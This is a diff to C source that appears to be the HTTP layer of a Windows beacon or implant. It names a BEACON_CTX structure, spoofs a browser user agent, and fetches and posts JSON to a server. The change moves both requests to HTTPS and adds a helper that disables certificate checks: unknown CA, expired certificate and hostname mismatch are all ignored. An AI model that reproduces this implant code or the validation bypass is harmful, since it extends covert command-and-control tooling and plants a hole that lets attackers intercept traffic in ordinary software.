@@ -68,6 +68,13 @@ static char *json_str_heap(const char *start, const char *end,
 }
 
 /* ── HTTP helpers ───────────────────────────────────────── */
+static void tls_ignore(HINTERNET hReq) {
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+}
+
 static char *http_get_body(BEACON_CTX *ctx, const wchar_t *path, DWORD *out_len) {
     *out_len = 0;
     HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0",
@@ -79,8 +86,11 @@ static char *http_get_body(BEACON_CTX *ctx, const wchar_t *path, DWORD *out_len)
     if (!hConn) { WinHttpCloseHandle(hSess); return NULL; }
     HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL,
                                         WINHTTP_NO_REFERER,
-                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                        WINHTTP_FLAG_SECURE);
     if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return NULL; }
+
+    tls_ignore(hReq);
 
     if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
@@ -125,8 +135,11 @@ static void http_post_json(BEACON_CTX *ctx, const wchar_t *path,
     if (!hConn) { WinHttpCloseHandle(hSess); return; }
     HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path, NULL,
                                         WINHTTP_NO_REFERER,
-                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                        WINHTTP_FLAG_SECURE);
     if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return; }
+
+    tls_ignore(hReq);
 
     WinHttpSendRequest(hReq,
                        L"Content-Type: application/json\r\n", (DWORD)-1L,
